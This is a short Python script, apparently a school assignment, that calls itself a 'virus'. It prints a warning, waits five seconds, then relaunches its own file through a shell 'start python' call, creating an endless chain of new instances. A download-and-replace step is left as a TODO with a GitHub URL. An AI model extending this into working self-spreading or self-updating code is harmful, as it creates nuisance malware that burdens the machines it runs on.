import time
import os
import inspect
import subprocess

print("Greetings, this is your friendly neighbourhood virus.")
print("To stop me, close this terminal before I print the 'proceeding' message.")
time.sleep(5)
print("proceeding")

#get filename and path of current instance
filename = inspect.getframeinfo(inspect.currentframe()).filename
path = os.path.dirname(os.path.abspath(filename))

#TODO: Download newest version

#https://github.com/castawaywars/M122_AP18c_Thema_Anderfuhren_Schuhmacher.git
#lb1_virus_patience_reloaded.py
#https://github.com/castawaywars/M122_AP18c_Thema_Anderfuhren_Schuhmacher/blob/b2b131f0d197bba3aebfa68e1fb0812fa0004cde/lb1_virus_patience_reloaded.py

#I hope that's the right path. The other three haven't been tested.
download_path="https://github.com/castawaywars/M122_AP18c_Thema_Anderfuhren_Schuhmacher/blob/Anderfuhren/lb1_virus_patience_reloaded.py"



#TODO: Store new file in the same directory under a new name



#prepare filename to be callable
filestring=str(filename)
filestring='"'+filestring+'"'
#run new instance
subprocess.call("start python "+filestring, shell=True)

print("end of instance")
